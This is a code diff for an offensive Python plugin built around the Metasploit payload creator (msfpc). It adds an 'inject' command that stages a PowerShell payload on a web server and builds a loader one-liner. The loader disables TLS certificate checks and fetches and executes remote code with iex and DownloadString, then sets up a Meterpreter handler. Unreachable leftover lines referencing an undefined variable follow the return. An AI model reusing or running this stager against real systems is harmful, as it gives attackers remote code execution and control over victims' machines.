@@ -9,7 +9,7 @@ ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
 MSFPC_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mpc", "msfpc.sh")
 
 def get_cmds():
-    return ['msfpc', 'drop', 'drop_meterpreter', 'catch_rc']
+    return ['msfpc', 'inject', 'drop', 'drop_meterpreter', 'catch_rc']
 
 #cmd_str = Raw user input
 # args = everything but the msfpc part (best effort)
@@ -93,6 +93,24 @@ def _rename(path, name):
 
 def drop(cmd_str, arg_str=""):
     return drop_meterpreter(cmd_str, arg_str)
+
+def inject(cmd_str, arg_str):
+    if not "ps1" in arg_str:
+        print("This method only works for powershell (ps1) payloads")
+        return
+
+    payload, handler = _msfpc(cmd_str, arg_str) 
+
+    url = plugin.cp_to_static(payload)
+    print("Stage 2 ready at : {}".format(url))
+    handler_cmd = _patch_handler(handler)
+
+    loader = 'powershell.exe -c \'[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; iex(New-Object Net.WebClient).DownloadString("'+ url +'") ;\' '
+
+    return plugin._inject_tool(loader, handler_cmd)
+
+    print(cmds)
+    return cmds
 
 def drop_meterpreter(cmd_str, arg_str=""):
     target = plugin._get_target()
